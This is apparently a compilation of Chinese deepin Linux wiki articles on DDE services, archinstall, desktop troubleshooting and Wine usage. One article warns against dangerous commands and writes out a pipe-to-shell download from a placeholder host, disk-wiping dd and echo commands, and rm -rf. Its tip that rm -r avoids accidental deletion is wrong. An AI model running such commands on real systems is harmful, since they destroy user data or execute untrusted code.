DDE桌面组件包括前后端组件，前端有任务栏、启动器等，后端有Dock和Launcher服务。任务栏加载应用程序依赖后台服务com.deepin.daemon.Dock，该服务处理右键菜单、打开、激活等功能接口。启动任务栏应用程序的方法包括：任务栏点击、终端命令（dde-control-center -s）、DBus调用（dbus-send...ControlCenter.Show）、以及d-feet工具操作。启动器软件列表加载依赖com.deepin.daemon.Launcher服务，它扫描/usr/share/applications下的.desktop文件获取软件信息。

DDE组件运行机制中，任务栏和启动器组件加载代码位于dock项目，后台服务提供功能接口。通过pstree可见Launcher启动的程序父进程是startdde，但任务栏点击启动器时父进程为systemd，因实际通过DBus调用launcher的show函数启动（类似dbus-send方式）。日志查看路径包括：Lightdm(/var/log/lightdm/)、startdde(journalctl)、dde-dock(~/.cache/deepin/)等组件专用日志位置。

标题：用archinstall自动化脚本安装Arch Linux
archinstall是一个用于安装 Arch Linux 的帮助库。它和其它的预配置安装程序一起打包。archinstall以纯文本形式存储所有用户和（辅助）磁盘加密的密码。archinstall的默认配置与安装指南不同。如使用 archinstall 安装系统出现问题的话，请在反馈中注明，并提供/var/log/archinstall/install.log。

以UEFI方式启动为例运行安装程序时，首先需按照安装指南#安装前的准备中的启动到 Live 环境操作。archinstall 包是 live 镜像的一部分，可以直接运行。

指导程序将执行（或查询）以下步骤：配置区域、选择镜像、分区磁盘、格式化分区、设置 root 密码、安装引导加载程序。

磁盘分区及格式化配置时，选择Drive(s)选项后进入，选择/dev/sda磁盘选项；然后选择Disk layout选项后进入，可以直接选择系统建议分区方式；接着选择磁盘格式，配置完成后保存退出。

其他相关参数选项配置中，演示安装的是DDE桌面环境，添加的安装包也是deepin相关。具体包括：1. Mirror region配置为China；2. Root password设置root账户的密码；3. Audio配置为pulseaudio；4. Additional packages配置增加额外的安装包有：grub efibootmgr sudo vim ttf-dejavu deepin deepin-extra lightdm xorg-server deepin-kwin networkmanager；5. Network configuration配置为Use NetworkManager；6. Timezone配置为Asia/Shanghai。

配置完成后开始安装即可。

配置完成后开始安装即可。安装过程包含多个阶段，系统会显示安装进度。

标题：电量不足,请接入电源
电量不足,请接入电源。但插入电源后无法恢复正常。这个时候可能需要手动关闭dde-lowpower进程。按下Ctrl Alt F2切换到tty2。输入用户名回车，密码回车，登录成功后执行。pkill dde-lowpower。最后按Ctrl Alt F1返回桌面环境即可恢复正常。

标题：系统无法扫描WiFi列表，该如何解决？
系统无法扫描WiFi列表，该如何解决？该问题一般是未安装网卡驱动导致的。解决方法如下：1. 在终端中执行命令重启无线网卡服务：systemctl restart network-manager.service。2. 若没有网卡驱动，需安装无线网卡驱动，可执行命令查看无线网卡型号：lspci | grep -i ethernet。3. 若是Realtek无线网卡，可访问https://github.com/lwfinger/rtlwifi_new获取对应型号的驱动并下载；其他型号需自行查找。4. 解压缩下载的驱动文件，找到rtlwifi_new-master文件夹。5. 进入该文件夹，右键选择【在终端中打开】，输入命令：make；sudo make install；sudo modprobe <无线网卡型号>。6. 重启系统。本篇wiki原文链接：https://www.deepinos.org/d/102-deepin。参考论坛帖子：https://bbs.deepin.org/forum.php?mod=viewthread&tid=153154。

标题：触控板的常见问题及解决方法
解决系统触摸板不生效或不能使用的问题，可按以下步骤操作：1. 在终端执行sudo apt-get install xinput命令安装程序；2. 下载脚本链接: https://pan.baidu.com/s/1kWUbM67 密码: e8za；3. 在脚本目录执行python3 xinput_detail.py命令，最后把输出的信息反馈到社区，等待解决。

禁用触摸板的方法：一般机型可在终端执行命令：sudo modprobe psmouse（启用触摸板）、sudo rmmod psmouse（禁用触摸板）；ThinkPad之类含有摇杆的机型，可使用命令仅禁用触摸板而保留摇杆：synclient TouchpadOff=1（禁用触摸板）、synclient TouchpadOff=0（恢复触摸板）。

设置触摸板为自然滚动方式的方法：方法一：1. 打开控制中心，选择【鼠标】，进入鼠标设置界面。2. 选择【鼠标】，并打开【自然滚动】按钮。方法二：1. 在家目录下新建或者修改 .Xmodmap 文件，在终端中执行命令：gedit ~/.Xmodmap；2. 添加或者修改内容为: pointer = 1 2 3 5 4 7 6 8 9 10 11 12；3. 注销当前用户再登录即可生效。

设置触摸板为边缘滚动与双指滚动的方法：在 xf86-input-libinput 驱动下，双指垂直滚动与边缘滚动只能二选一，谁后设置的谁生效；在 xf86-input-synaptics 下两者可以同时开启。相关命令：gsettings set com.deepin.dde.touchpad edge-scroll-enabled true（开启边缘滚动）；gsettings set com.deepin.dde.touchpad vert-scroll-enabled true（开启双指垂直滚动）；gsettings set com.deepin.dde.touchpad horiz-scroll-enabled true（开启双指水平滚动）。

标题：输入密码无法进入桌面
输入密码认证后, 无法进入桌面, 又弹出到输入密码界面。这种情况一般都是startdde启动失败。切换tty2, 查询startdde进程: ps -ef |grep startdde。输入该命令后, 假如没有startdde进程运行的相关信息,就表示startdde启动失败。此时大概率是deepin-desktop-schemas版本与dde-daemon不匹配。在tty2输入命令：export DISPLAY=:0。执行/usr/bin/startdde: /usr/bin/startdde。一般启动startdde后，在最上面一点会报出具体哪个接口错误。从其他机器拷贝与startdde版本匹配的deepin-desktop-schemas, 然后进行安装，可以使用scp远程将对应的deepin-desktop-schemas的deb包拷贝到指定机器。如果无法拿到新版本的deepin-desktop-schemas的deb包, 可以将startdde降级; 通过apt policy startdde, 查询startdde的版本信息, 可以使用命令安装其他版本: sudo apt install startdde=xxx

标题：输入法图标异常问题
输入法图标异常的可能原因是输入法安装包版本集成错误或是依赖包集成时遗漏。在切换五笔拼音输入法后，任务栏图标正常时应显示一个'五'的图标，图标异常时有对应的异常显示。

解决输入法图标异常可按以下步骤操作：1. 删除已安装输入法，命令为sudo apt-get remove fcitx*；删除依赖库，命令为sudo apt-get autoremove；检测是否删除fcitx，命令为dpkg --get-selections | grep fcitx。

2. 依次安装下列包，安装命令为sudo apt-get install ****，需安装的包包括：fcitx、fcitx-bin、fcitx-config-common、fcitx-config-gtk、fcitx-data、fcitx-frontend-gtk2、fcitx-frontend-gtk3、fcitx-frontend-qt4、fcitx-libs、fcitx-module-dbus、fcitx-module-x11、fcitx-modules、fcitx-table、fcitx-table-wbpy、fcitx-ui-classic。

3. 重启。若重启后输入法图标恢复正常，即说明安装包集成有问题，可以对应上面的包名在系统中查询版本号，若显示未安装或对应版本号不匹配，重新集成时更正为相应的版本即可修复。

标题：那些linux中，常见的危险命令介绍
在 Linux 中，有几个强大而危险的命令需要谨慎使用，因为不正确的使用可能导致数据损失、系统崩溃或安全漏洞。以下是一些常见的危险命令:

rm 命令用于删除文件和目录。但是，当使用 rm 命令时，请务必谨慎，因为没有将其发送到回收站，而是直接永久删除。如果指定的路径或选项有误，可能会不可逆地删除重要文件或整个目录。为了避免意外删除，建议在使用 rm 时使用额外的选项，如 -i（交互式删除）或 -r（递归删除）。rm -rf命令，该命令可能导致不可恢复的系统损坏，会强制删除指定对象

dd 命令是一个低级磁盘操作工具，可以用于创建、复制或转换磁盘映像。虽然 dd 命令非常强大，但也非常危险，因为它没有确认和安全检查。如果使用错误的参数或目标设备，可能会误操作并损坏磁盘上的数据。因此，在使用 dd 命令时要小心验证目标设备和参数，确保正确操作。dd if=/dev/zero of=/dev/had, 这个命令会将整个主硬盘清零

chmod 命令用于更改文件和目录的权限。错误的权限设置可能导致对敏感文件的未经授权访问，或者禁止合法用户对文件的访问。例如，错误地将系统文件的权限设置为可写，可能导致系统的不稳定性或安全漏洞。在使用 chmod 命令时，请确保使用正确的权限模式和目标文件

mkfs 命令用于创建文件系统，例如创建新的 ext4 或 xfs 文件系统。但是，执行 mkfs 命令会完全覆盖目标设备上的文件系统，删除其中的所有数据。如果选择了错误的设备或参数，可能会不可逆地损坏磁盘上的数据。因此，在使用 mkfs 命令时，请谨慎选择目标设备，并确保备份重要数据

wget http://xxx.com/xxx.sh -O- | sh 此命令是不安全的，执行此命令会从指定的 URL 下载 `xxx.sh` 脚本，并立即将其传递给 `sh` 命令执行。危险性在于，无法确定从该 URL 获取的脚本是什么内容，存在以下潜在风险：1. 下载恶意脚本：不受信任的来源可能会提供恶意脚本，它可能会损坏您的系统、窃取敏感信息或进行其他不良操作。2. 未经验证的来源：您可能不了解该 URL 的真实来源和可信度。这意味着您无法确认下载的脚本是否被篡改、是否包含恶意代码或是否来自受信任的作者。3. 自动执行脚本：使用 `sh` 命令执行下载的脚本，无法对其进行审查和验证。这可能导致不可预测的行为，包括完全接管您的系统或对其进行损坏

`echo """" > /dev/sda` 是非常危险且具有破坏性的。执行此命令会将空字符串写入 `/dev/sda` 设备，对于 Linux 系统来说，`/dev/sda`通常是主要硬盘设备，写入空字符串将导致你的硬盘上的数据全部被覆盖。这会导致数据的不可恢复性丢失，并可能导致系统无法启动

>> test.txt，这个命令常用来清空文件内容或者记录命令输出，执行之前需要考虑清楚，避免不必要的数据丢失

mv 文件夹 /dev/null, /dev/null是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。这个命令不能阻止数据恢复软件对操作进行恢复

在 Linux 中，rm、dd、chmod 和 mkfs 等命令具有强大的功能，但也需要小心使用，以避免不可逆的损失。在使用这些命令之前，最好进行备份并仔细验证目标设备和指定的参数，以确保正确的操作。在任何时候，使用管理员身份，都应谨慎操作，避免不可逆的操作导致数据损失，硬件有价，数据无价

标题：Wine
Wine（“Wine Is Not an Emulator” 的首字母缩写）是一个能够在多种 POSIX-compliant 操作系统（诸如 Linux，macOS 及 BSD 等）上运行 Windows 应用的兼容层。Wine 不是像虚拟机或者模拟器一样模仿内部的 Windows 逻辑，而是将 Windows API 调用翻译成为动态的 POSIX 调用，免除了性能和其他一些行为的内存占用，让你能够干净地集合 Windows 应用到你的桌面。

默认情况下，Wine 将使用位于 `~/.wine/` 的默认容器。另见：[深度论坛：[新手教程] Deepin用wine安装的Windows软件目录在哪?](https://bbs.deepin.org/zh/post/227183)

设置 `WINEPREFIX` 变量可以改变使用的 Wine 容器的位置。如 `env WINEPREFIX=~/.wine/wineqq/ wine "C:\\pcqq2021.exe"` 将在位于 `~/.wine/wineqq/` 目录下的容器中启动 `C:\pcqq2021.exe` 程序。

Deepin-Wine适配知识库：https://docs.qq.com/mind/DWFBpbmpjd0RtV2Z0

为 Wine 程序添加快捷键，详见：[[新手教程] wine程序添加快捷键（通用）](https://bbs.deepin.org/zh/post/219312)

*.desktop 文件创建，参见：[深度论坛：[新手教程] exe文件怎么打开运行](https://bbs.deepin.org/post/231651)

Winetricks 是一个帮助用户调整 Wine 设置、下载安装 Wine 所需的 Windows 组件的应用程序。执行命令安装：```sudo apt install winetricks``` 仓库地址为：https://github.com/Winetricks/winetricks

wine 运行器是 gfdgd xi 使用 Python3 的 tkinter 制作的 wine 运行工具。可以在不打开终端的情况下选取 Wine 版本、选择容器、运行应用的工具。是对如下命令的简易封装：```WINEPREFIX=容器路径 wine（wine的路径） 可执行文件路径``` 仓库地址为：https://gitee.com/gfdgd-xi/deep-wine-runner

如果终端执行遇到```Traceback (most recent call last):  File "/usr/bin/deepin-wine-runner", line 19, in <module>    import ttkthemesModuleNotFoundError: No module named 'ttkthemes'```执行：```sudo apt install python3-pip``````sudo pip3 install ttkthemes```

Vek，参见：[Vek](http://old.deepin.wiki/index.php?title=Vek)

请参阅：- https://wiki.archlinux.org/title/Wine - https://wiki.winehq.org/Main_Page

标题：【Wine游戏助手教程】全屏游戏退出后桌面分辨率没有自动恢复该怎么办
如图这样设置一下，下次就能自动恢复分辨率了。

设置界面显示调整选项，如图配置可实现全屏游戏退出后自动恢复桌面分辨率。

标题：原生Wine安装/运行exe程序方法指南
以下教学以32位7-Zip的安装程序7z2107.exe（版本21.7.0.0）为案例软件，该exe程序放在系统下载（Downloads）文件夹，即/home/$USER/Downloads/7z2107.exe，或者写作~/Downloads/7z2107.exe。多数情况下，/home/$USER与~可以相互替代。Wine对32位的exe程序支持较好，所以尽量选择32位的软件。查看系统上原生Wine的版本，终端输入：
```bash
wine --version
```原生Wine的默认容器路径：/home/$USER/.wine 或~/.wine。

用原生Wine安装/运行Windows软件的方法：
### 方法1：安装程序到默认容器（方法1不推荐，推荐方法2）
终端输入：
```bash
wine /exe文件路径
```案例：
```bash
wine ~/Downloads/7z2107.exe
```安装好后，就可以在/home/$USER/.wine/drive_c/Program Files里看到7-Zip的程序文件了。
### 方法2：安装程序到一个新建的容器
终端命令：
```bash
WINEARCH=win32或者wine64 WINEPREFIX=容器路径 wine 需安装/运行的exe软件的路径
```案例：
```bash
WINEARCH=win32 WINEPREFIX=~/.deepinwine/Wine-7zip wine ~/Downloads/7z2107.exe
```（注：如果提示安装mono，可点取消。mono模拟的.NET Framework，不是所有exe软件都需要这个。需要的时候你再手动安装即可）
上述命令结构解析：
1. `WINEARCH=`后面写win32，表示新建32位容器；写win64则为64位容器。
2. `WINEPREFIX=`指定容器路径（不存在时自动新建）。
3. wine即原生Wine执行程序。（若用Deepin-Wine可替换执行程序名）

运行已安装到容器内的exe主程序：终端命令：
```bash
WINEPREFIX=容器路径 wine “c:/exe主程序虚拟C盘（即drive_c）里的路径”
```案例：
```bash
WINEPREFIX=~/.deepinwine/Wine-7zip wine "c:/Program Files/7-Zip/7zFM.exe"
```

可设置虚拟Windows版本、替换dll函数、窗口修饰、显示分辨率等。
1. 修改Windows版本
默认Windows版本是Windows 7，若exe安装提示系统版本太低，需利用winecfg修改为Windows 10；若软件在XP表现更好则改XP。打开winecfg的终端命令：
```bash
WINEPREFIX=容器路径 winecfg
```案例：
```bash
WINEPREFIX=~/.deepinwine/Wine-7zip winecfg
```
上述命令结构解析：`WINEPREFIX=`指定容器路径后空格输入winecfg
案例软件7-Zip无需修改版本即可运行。
2. 函数库函数顶替
多数软件无需新增函数顶替；常见新增函数顶替包括atl100、mlang、msls31、riched20、usp10；个别软件需额外添加msvcp60、riched32等函数。案例软件7-Zip无需新增顶替函数即可运行。

由于Linux系统默认缺少Arial、微软雅黑、宋体等Windows常用字体，Wine安装软件可能出现乱码/方块字/字体缺失问题。字体设置方法有三种：
### 第一种：直接安装“Win字体”应用
到星火应用商店下载安装。安装后调出winecfg，字体选项下勾选“允许加载系统字体”和“允许加载Windows Fonts目录字体”（新版本可能默认此设置）。
### 第二种：复制字体文件到虚拟C盘字体文件夹
将所需字体文件（如宋体simsun.ttf）复制到容器字体路径：`~/.deepinwine/容器名称/drive_c/windows/Fonts`。案例路径：`~/.deepinwine/Wine-7zip/drive_c/windows/Fonts`
调出winecfg后勾选相同字体加载选项。
### 第三种：修改字体注册表
不安装字体，通过注册表替换字体映射。打开注册表命令：
```bash
WINEPREFIX=容器路径 regedit
```案例：
```bash
WINEPREFIX=~/.deepinwine/Wine-7zip regedit
```找到HKEY_CURRENT_USER\Software\Wine\Fonts\Replacements（无则新建项），添加字符串值项（如SimSun→Noto Serif CJK SC替换）。可使用预制reg文件批量导入。

安装winetricks的终端命令：
```bash
sudo apt install winetricks
```运行winetricks的终端命令：
```bash
WINEPREFIX=~/.deepinwine/Wine-7zip winetricks
```选择默认容器后按需安装运行时、组件、dll。案例软件7-Zip无需设置winetricks。

在桌面新建txt文件复制以下内容：
```ini
[Desktop Entry]
Categories=Application
Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Wine-7zip wine "c:/Program Files/7-Zip/7zFM.exe"'
Icon=/usr/share/icons/Default/devices/64/media-optical.svg
MimeType=
Name=7-zip
StartupNotify=true
Type=Application
X-Deepin-Vendor=user-custom
```保存txt后右键重命名，将后缀改为desktop。
注：Exec=部分需完整写容器路径；Icon=指定64×64尺寸svg/png图标路径；Name=自定义桌面图标显示名称。

终端命令：
```bash
WINEPREFIX=容器路径 wine "c:/exe软件的卸载程序uninstall.exe的路径"
```案例：
```bash
WINEPREFIX=~/.deepinwine/Wine-7zip wine "c:/Program Files/7-Zip/Uninstall.exe"
```

标题：用deepin-wine6安装/运行exe程序的方法
注：建立deepin-wine6-stable环境：新装的系统需要安装一款应用商店里使用deepin-wine6-stable运行的wine应用（如wine版微信、wine版QQ），并运行一下。（系统会自动建立deepin-wine6-stable环境）

安装程序到新建容器的终端命令：WINEARCH=win32或者wine64 WINEPREFIX=容器路径 deepin-wine6-stable 需安装的exe路径。案例：WINEARCH=win32 WINEPREFIX=~/.deepinwine/Wine-7zip deepin-wine6-stable ~/Downloads/7z2107.exe

运行已安装exe的终端命令：WINEPREFIX=容器路径 deepin-wine6-stable "c:/exe主程序在虚拟C盘的路径"。案例：WINEPREFIX=~/.deepinwine/Wine-7zip deepin-wine6-stable "c:/Program Files/7-Zip/7zFM.exe"

设置winecfg的方法：WINEPREFIX=容器路径 /opt/deepin-wine6-stable/bin/winecfg。可修改Windows版本（默认为Windows 7）和dll函数顶替（如添加atl100、msls31等）。案例软件7-Zip无需修改即可运行。

解决字体问题的三种方法：1.安装"Win字体"应用并勾选加载系统字体；2.复制字体文件到容器Fonts目录：~/.deepinwine/容器名/drive_c/windows/Fonts；3.修改注册表替换字体（如SimSun替换为Noto Serif CJK SC）

创建桌面快捷方法：新建.desktop文件，内容示例：[Desktop Entry]
Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Wine-7zip deepin-wine6-stable "c:/Program Files/7-Zip/7zFM.exe"'
Name=7-zip。注意Exec路径不能使用~符号

卸载exe软件的终端命令：WINEPREFIX=容器路径 deepin-wine6-stable "c:/exe的卸载程序路径"。案例：WINEPREFIX=~/.deepinwine/Wine-7zip deepin-wine6-stable "c:/Program Files/7-Zip/Uninstall.exe"

注：1. 建立deepin-wine6-stable环境：新装的系统需要安装一款应用商店里使用deepin-wine6-stable运行的wine应用（如wine版微信、wine版QQ），并运行一下。（系统会自动建立deepin-wine6-stable环境）2. 以下教学以32位7-Zip的安装程序7z2107.exe（版本21.7.0.0）为案例软件，该exe程序我放在系统下载（Downloads）文件夹，即/home/$USER/Downloads/7z2107.exe，或者写作~/Downloads/7z2107.exe。多数情况下，/home/$USER与~可以相互替代。

一、安装exe程序。安装程序到一个新建的容器。终端命令：WINEARCH=win32或者wine64 WINEPREFIX=容器路径 deepin-wine6-stable 需安装/运行的exe软件的路径。案例：WINEARCH=win32 WINEPREFIX=~/.deepinwine/Wine-7zip deepin-wine6-stable ~/Downloads/7z2107.exe。（注：如果提示安装mono，可点取消。mono模拟的.NET Framework，不是所有exe软件都需要这个。需要的时候你再手动安装即可）

上述命令结构解析：1. WINEARCH=后面写win32，即表示新建一个32位的容器，如果写win64，即表示新建一个64位的容器。2. WINEPREFIX=是指定的容器路径（此处Wine-7zip就是容器名称，如果容器Wine-7zip不存在，默认会新建这个容器）。3. 如果要用deepin-wine5，中间可以写成deepin-wine5；如果要用deepin-wine5-stable，中间可以写成~/.deepinwine/deepin-wine5-stable/bin/wine。4. 最后接的是你要安装的exe安装程序的所在路径。

三、winecfg设置。可设置Windows版本、替换dll函数、窗口修饰、显示分辨率等。1. 修改Windows版本。默认的Windows版本是Windows 7，有的exe安装时提示系统版本太低的话，就需要利用winecfg修改为Windows 10。有的exe软件在Windows XP表现更好，就需要用winecfg修改为Windows XP。打开winecfg的终端命令：WINEPREFIX=容器路径 /opt/deepin-wine6-stable/bin/winecfg。案例：WINEPREFIX=~/.deepinwine/Wine-7zip /opt/deepin-wine6-stable/bin/winecfg。

上述命令结构解析：WINEPREFIX=是指定的容器路径，后面打一个空格，然后输入winecfg所在路径 /opt/deepin-wine6-stable/bin/winecfg。案例软件7-Zip无需修改Windows版本即可正常运行。2. 函数顶替。有的exe软件，无需新增函数顶替。有的exe软件，新增以下几个函数顶替基本上就能正常运行了：atl100、mlang、msls31、riched20、usp10。有的exe软件还需要添加msvcp60、riched32等函数。案例软件7-Zip无需新增顶替函数即可正常运行。

方法1：直接安装“Win字体”应用（可以与方法2并用）。到星火应用商店里下载安装“Win字体”。安装好后，再调出winecfg（方法如前述），字体选项下勾选“允许加载系统字体”，建议顺便把“允许加载Windows Fonts目录下的字体”也勾上。

方法2：复制字体到虚拟C盘的字体文件夹（可以与方法1并用）。将exe软件需要用的字体文件（如宋体的文件为simsun.ttf）复制粘贴到容器的字体文件夹，路径通常为：~/.deepinwine/容器名称/drive_c/windows/Fonts。案例软件Fonts文件夹路径：~/.deepinwine/Wine-7zip/drive_c/windows/Fonts。调出winecfg（方法如前述），字体选项下勾选“允许加载Windows Fonts目录下的字体”，建议顺便把“允许加载系统字体”也勾上。

方法3：修改字体注册表（尽量不要与方法1和方法2并用）。不安装字体，而是在注册表里把需要的字体替换为你系统已有字体。打开注册表的命令：WINEPREFIX=容器路径 /opt/deepin-wine6-stable/bin/regedit。案例：WINEPREFIX=~/.deepinwine/Wine-7zip /opt/deepin-wine6-stable/bin/regedit。找到HKEY_CURRENT_USER\Software\Wine\Fonts\Replacements，如果没有Replacements，新建一个项，项名为Replacements。然后在Replacements下添加字符串值。如要把宋体（SimSun）替换为思源宋体（Noto Serif CJK SC），则字符串名称为SimSun，值为Noto Serif CJK SC。

五、winetricks设置。可以添加一些运行时、组件、dll。不是每一个exe软件都需要用到winetricks。案例软件7-zip无需设置winetricks。安装winetricks的终端命令：sudo apt install winetricks。运行winetricks的终端命令：WINEPREFIX=~/.deepinwine/Wine-7zip winetricks。选择默认的wine容器——安装windows DLL和组件，然后根据需要安装运行时、组件、dll。

六、给exe软件制作一个桌面图标。在桌面新建一个txt文件（如7zip.txt），复制以下内容到txt文件里：[Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Wine-7zip deepin-wine6-stable "c:/Program Files/7-Zip/7zFM.exe"' Icon=/usr/share/icons/Default/devices/64/media-optical.svg MimeType= Name=7-zip StartupNotify=true Type=Application X-Deepin-Vendor=user-custom。保存退出txt，右键重命名，把这个txt文件的后缀改为desktop（如7zip.desktop）。

注：Exec= ————sh -c 'WINEPREFIX=容器路径 deepin-wine6-stable "c:/exe主程序路径在虚拟C盘里的路径"'。Icon= ————指图标路径，文件格式一般为png、svg、icon，图标大小64×64为宜，图标格式最好是svg。Name= ————图标文件显示的名称。以上三项后面的内容可以根据你自己所安装的软件的实际情况更改。特别说明，Exec=后面不能用~来代替/home/$USER。

标题：3-打包deepin-wine6-stable应用的方法
准备deb的基本信息包括以下6点，建议写到一个txt文件中备用：1、容器名，建议格式为投稿平台名称-应用名称，案例：Spark-7zip，对应BOTTLENAME="Spark-7zip"；2、版本号，建议格式为该exe软件的windows版本号+投保平台名称+投稿版本，案例：21.7.0.0spark0（其中21.7.0.0是windows版本号，spark是星火应用商店，0是初始版本），对应APPVER="21.7.0.0spark0"；3、exe的主执行程序路径，案例：C:/Program Files/7-Zip/7zFM.exe，对应EXEC_PATH="c:/Program Files/7-Zip/7zFM.exe"；4、包名（应用标识），建议格式为软件官网网址倒着写，www替换为投稿的应用商店平台名称（深度应用商店为deepin，星火应用商店为spark），案例：org.7-zip.spark；5、图标Exce执行路径，格式："/opt/apps/包名/files/run.sh" -f %f，案例："/opt/apps/org.7-zip.spark/files/run.sh" -f %f；6、短述：一句话介绍打包的软件，案例：7-Zip是一款高压缩比的压缩软件。

建议在下载文件下创建package文件夹；在package文件夹创建files、entries、build三个文件夹。

制作桌面图标步骤：1、下载或提取图标文件（通常格式是png、ico、svg）；2、将图标文件格式转为svg格式（可使用在线转格式网址https://convertio.co/zh/ico-svg/或应用商店里的Inkscape另存为svg格式）；3、将svg图标文件存入entries文件夹，并重命名为包名.svg，案例：org.7-zip.spark.svg。

压缩容器步骤：1、将目标容器C盘（即drive_c）下面的users文件下面的当前用户名文件夹改为@current_user@；2、在目标容器里右键——在终端中打开，输入命令sed -i "s#$USER#@current_user@#" ./*.reg批量修改注册表里的当前用户名；3、在目标容器里右键——在终端中打开，输入命令7z a -t7z -r files.7z 容器路径/*（案例：7z a -t7z -r files.7z ~/.deepinwine/Wine-7zip/*）压缩目标容器为files.7z；4、将压缩好的files.7z移动到files文件夹。

由于deepin-wine6-stable是Deepin/UOS系统自带的，无需压缩deepin-wine6-stable。

制作执行程序run.sh步骤：将wine版微信的run.sh文件和dlls文件夹复制到files文件夹（路径：/opt/apps/com.qq.weixin.deepin/files/）；右键用文本编辑器打开run.sh，将准备deb基本信息中的1-4点信息替换run.sh里原有的信息，保存退出。

用UOS打包工具（Debreate）打包步骤：1、control：架构选择amd64或i386；2、依赖和冲突：依赖项填写deepin-wine6-stable和deepin-wine-helper（参考：deepin-wine6-stable:amd64 (>= 6.0.0.19-1)、deepin-wine-helper (>= 5.1.30-1)）；3、info文件：根据软件实际需要勾选应用权限；4、desktop文件：图标填写包名，分类根据实际情况选择；5、icon文件：添加entries文件夹里的图标文件；6、files目录文件：添加files文件夹里的files.7z、run.sh、dlls文件夹；7、添加脚本：添加Post-Remove脚本以在卸载时删除容器（案例脚本针对Spark-7zip容器，需替换为自己的容器名）；8、更新日志（非必须）；9、版权文件（非必须）；10、构建：点击开始构建图标，选择build文件夹，打包好的deb在build文件夹，可双击安装，安装后在启动器看到图标。

本文衔接上一帖内容，将已安装的windows软件7-zip（版本21.7.0.0）打包为deb格式。

准备deb基本信息包含6项：容器名格式为投稿平台-应用名（如Spark-7zip），版本号格式为软件版本+平台+投稿版（如21.7.0.0spark0），需设置EXEC_PATH主程序路径、包名（如org.7-zip.spark）等。

创建打包目录：在下载文件夹下新建package目录，其中必须包含files、entries、build三个子文件夹。

桌面图标制作：下载软件图标→转换为svg格式→重命名为包名.svg存放到entries文件夹（如org.7-zip.spark.svg）。

容器处理：1）将C盘users目录下当前用户名改为@current_user@；2）终端执行sed -i命令批量替换注册表用户名；3）用7z压缩容器至files.7z。

制作run.sh：从/opt/apps/com.qq.weixin.deepin/files/复制run.sh和dlls文件夹，修改其中容器名、版本号等4项参数。

用Debreate打包：1）control选择架构；2）填写依赖项deepin-wine6-stable和deepin-wine-helper；3）添加Post-Remove脚本自动卸载容器。

Post-Remove脚本示例：遍历/home目录删除容器文件夹，核心命令rm -rf /home/$username/.deepinwine/容器名

标题：4-用原生wine运行便携式exe程序绿色软件的方法
之前开帖介绍过用wine安装exe程序的方法，有朋友想知道用wine运行便携式exe程序（也称绿色软件）的方法，今天再开一帖介绍一下方法。学习本帖内容前建议先看前三帖内容。用wine运行绿色软件的方法其实跟[wine使用教程1-用原生wine安装/运行exe程序的方法](/zh/常见问题FAQ/Wine/wine如何安装运行exe程序)是差不多的，只不过少了安装程序的步骤而已。

1、下载免安装版exe软件并解压。案例软件：[32位ScreenToGif（下载时选择x86，系统要求windows8以上）](https://www.screentogif.com/?l=zh_cn)。友情提醒：大家下载exe软件尽量从它们的官网下载，以免下载到带毒的软件。

2、创建一个全新容器。创建容器的终端命令：```bash WINEARCH=win32或者wine64 WINEPREFIX=容器路径 wine winecfg ```。案例：```bash WINEARCH=win32 WINEPREFIX=~/.deepinwine/Wine-ScreenToGif wine winecfg ```。上述命令结构解析：（1）WINEARCH=后面写win32，即表示新建一个32位的容器，如果写win64，即表示新建一个64位的容器。（2）WINEPREFIX=是指定的容器路径（此处Wine-ScreenToGif就是准备新建的容器名称）。（3）wine即你指定的wine的执行程序，原生wine的执行程序就是wine。（如果要用deepin-wine，则这里可以换成`deepin-wine5`或者`deepin-wine6-stable`，或者`~/.deepinwine/deepin-wine5-stable/bin/wine`）。（注：创建容器时如果提示安装mono，可点取消。mono模拟的.NET Framework，不是所有exe软件都需要这个。需要的时候你再手动安装即可）。

案例软件ScreenToGif要求系统为windows8以上，所以在winecfg窗口里windows版本设定为windows10。特别说明：（1）经测试，案例软件ScreenToGif.exe不能用deepin-wine5和deepin-wine6-stable运行，可以用原生wine7.10运行（楼主已将原生wine版本升级为开发版wine-devel 7.10），因此本帖用原生wine7.10做例子。（2）Deepin系统预装的原生wine版本是4.0，过于老旧，喜欢尝鲜的小伙伴建议升级原生wine到最新版本。（3）**升级原生wine的方法见WineHQ官网：** https://wiki.winehq.org/Debian_zhcn

3、拷贝exe软件目录至容器c盘中。容器路径：~/.deepinwine/Deepin-ScreenToGif。案例软件解压后只有一个主程序ScreenToGif.exe，我在容器的drive_c文件夹（即模拟的c盘）Program Files文件夹下新建一个ScreenToGif文件夹，用于放置ScreenToGif.exe。

4、测试运行。运行exe程序的终端命令：```bash WINEPREFIX=容器路径 wine "exe主程序在容器c盘中的路径" ```。案例：```bash WINEPREFIX=~/.deepinwine/Wine-ScreenToGif wine "c:/Program Files/ScreenToGif/ScreenToGif.exe" ```。

5、安装字体。之前教程介绍过，解决字体问题有三种方法，我个人建议小白直接安装星火应用商店里的“Win字体”即可。

6、创建桌面图标。在桌面新建一个txt文件（如screentogif.txt），复制以下内容到txt文件里：```ini [Desktop Entry] Categories=Application Exec=sh -c 'WINEPREFIX=/home/$USER/.deepinwine/Wine-ScreenToGif wine "c:/Program Files/ScreenToGif/ScreenToGif.exe"' Icon=/usr/share/icons/Default/devices/64/media-optical.svg MimeType= Name=ScreenToGif StartupNotify=true Type=Application X-Deepin-Vendor=user-custom ```。注：Exec= ————sh -c 'WINEPREFIX=容器路径 wine "c:/exe主程序路径在虚拟C盘里的路径"' 特别提醒:这里/home/$USER/不能写成~/。Icon= ————指图标路径，文件格式一般为png、svg、icon，图标大小64×64为宜，图标格式最好是svg。Name= ————图标文件显示的名称。以上三项后面的内容可以根据你自己所安装的软件的实际情况更改。上面的内容填写好后保存退出txt，右键重命名，把这个txt文件的后缀改为desktop（如screentogif.desktop）。这样就可以双击桌面图标运行该软件了。

5、其他配置。以上步骤为基础步骤。但除以上步骤外，有的exe软件还需要替换dll函数库，会用到winecfg、winetricks，有的软件需要安装mono或Gecko，有的软件还需要安装dxvk。这些都是比较高级的玩法，楼主能力有限，无法为大家讲解。------经测试，案例软件无法在wine7.10里完美运行，使用过程会崩溃闪退。本帖仅做讲解运行绿色软件的基本方法，并不深究软件崩溃的原因。

标题：5-用原生wine运行绿化版exe程序bat文件的方法
